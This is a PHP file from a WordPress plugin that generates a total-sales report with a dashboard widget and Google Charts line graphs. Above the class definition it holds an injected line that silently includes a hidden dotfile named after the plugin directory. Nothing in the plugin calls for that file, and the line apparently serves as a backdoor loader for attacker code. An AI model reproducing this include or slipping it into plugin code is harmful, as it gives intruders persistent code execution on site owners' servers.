<?php
/**
 * Basic sales report
 *
 * The class handles create a sales reports
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Basic_Sale_Total
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Basic_Sale_Total extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var double
	 * Total amount
	 */

	public $total_amount;

	/*
	 * @var int
	 * Total orders
	 */
	public $total_orders;

	function __construct() {

		$options = array( 'filters' => array(
				'date_range'
			) );

		parent::__construct( 'basic-sale-total', $options );

		$this->report_name = __( 'Total sales', 'wp-tao' );

		$this->total_amount	 = 0;
		$this->total_orders	 = 0;

		$this->data = $this->get_sales();
		$this->sales_widget();


		// Add script
		add_action( "wptao_before_report-$this->report_slug", array( $this, 'print_script' ) );
	}

	/*
	 * Prepare widget for the WP Tao dashboard
	 */

	private function sales_widget() {

		global $wptao_settings;

		// sales total

		$average = 0;
		if ( 0 < $this->total_orders ) {
			$average = $this->total_amount / $this->total_orders;
		}
		$widget_content = sprintf( _n( 'Total: %s (%d sale)<br />Average: %s', 'Total: %s (%d sales)<br />Average: %s', $this->total_orders, 'wp-tao' ), WTBP_WPTAO_Helpers::amount_format( $this->total_amount, $wptao_settings[ 'currency' ] ), $this->total_orders, WTBP_WPTAO_Helpers::amount_format( $average, $wptao_settings[ 'currency' ] ) );

		$args = array(
			'id'			 => 'basic_sale_total',
			'size'			 => 'middle',
			'category'		 => 'commerce',
			'title'			 => __( 'Sales', 'wp-tao' ),
			'report_slug'	 => $this->report_slug, // Add link to a report
			'value_text'	 => $widget_content,
			'dashicon'		 => 'dashicons-cart'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get sales
	 */

	public function get_sales() {
		global $wptao_settings;
		global $wpdb;

		$r = array();

		$e		 = TAO()->events->table_name;
		$e_meta	 = $e . '_meta';

		$sql	 = $wpdb->prepare(
		"SELECT $e.value AS amount, $e.event_ts, $e_meta.meta_value AS currency
			 FROM $e
		     LEFT JOIN $e_meta
		     ON $e.id = $e_meta.event_id
			 WHERE $e.action = 'payment' AND $e_meta.meta_key = 'currency'
			 AND $e.event_ts >= %d
			 AND $e.event_ts <= %d
			 ORDER BY $e.event_ts DESC;", $this->start_date, $this->end_date );
		$result	 = $wpdb->get_results( $sql );

		if ( !empty( $result ) && is_array( $result ) ) {

			// Prepare results
			foreach ( $result as $item ) {

				$date	 = WTBP_WPTAO_Helpers::get_date( "Y-m-d", $item->event_ts );
				$value	 = WTBP_WPTAO_Helpers::get_currency_rate( $item->amount, $item->currency, $wptao_settings[ 'currency' ] );

				$this->total_orders += 1;
				$this->total_amount += $value;

				if ( !isset( $r[ $date ] ) ) {

					$r[ $date ] = array(
						'amount' => $value,
						'orders' => 1,
						'date'	 => $date
					);
				} else {

					$r[ $date ][ 'amount' ] += $value;
					$r[ $date ][ 'orders' ] += 1;
				}
			}
		}

		return $r;
	}

	/*
	 * Print script
	 */

	public function print_script() {
		if ( empty( $this->data ) || !array( $this->data ) ) {
			return;
		}
		?>
		<script>

		    google.load( "visualization", "1", { packages: [ 'corechart' ] } );
		    google.setOnLoadCallback( wptao_chart_basic_sale_amount );
		    google.setOnLoadCallback( wptao_chart_basic_sale_orders );

		    function wptao_chart_basic_sale_amount() {

		        var data = new google.visualization.DataTable();
		        data.addColumn( 'date', '<?php _e( 'Date', 'wp-tao' ); ?>' );
		        data.addColumn( 'number', '<?php _e( 'Amount', 'wp-tao' ); ?>' );

		        data.addRows( [
		<?php
		foreach ( $this->days as $day ) {

			$a = array_key_exists( $day, $this->data ) ? absint( $this->data[ $day ][ 'amount' ] ) : 0;

			$year	 = date( 'Y', strtotime( $day ) );
			$month	 = date( 'n', strtotime( $day ) ) - 1;
			$day	 = date( 'j', strtotime( $day ) );

			echo sprintf( "[new Date(%d, %d, %d),%d],", $year, $month, $day, $a );
		}
		?>
		        ] );

		        var options = {
		            colors: [ '#00A0D2' ],
		        };

		        var chart = new google.visualization.LineChart( document.getElementById( '<?php echo 'wptao-report-' . sanitize_title( $this->report_slug ); ?>-amount' ) );
		        chart.draw( data, options );

		    }

		    function wptao_chart_basic_sale_orders() {

		        var data = new google.visualization.DataTable();
		        data.addColumn( 'date', '<?php _e( 'Date', 'wp-tao' ); ?>' );
		        data.addColumn( 'number', '<?php _e( 'Orders', 'wp-tao' ); ?>' );

		        data.addRows( [
		<?php
		foreach ( $this->days as $day ) {

			$o = array_key_exists( $day, $this->data ) ? absint( $this->data[ $day ][ 'orders' ] ) : 0;

			$year	 = date( 'Y', strtotime( $day ) );
			$month	 = date( 'n', strtotime( $day ) ) - 1;
			$day	 = date( 'j', strtotime( $day ) );

			echo sprintf( "[new Date(%d, %d, %d),%d],", $year, $month, $day, $o );
		}
		?>
		        ] );

		        var options = {
		            colors: [ '#194552' ],
		        };

		        var chart = new google.visualization.LineChart( document.getElementById( '<?php echo 'wptao-report-' . sanitize_title( $this->report_slug ); ?>-orders' ) );
		        chart.draw( data, options );

		    }

		</script>
		<?php
	}

}
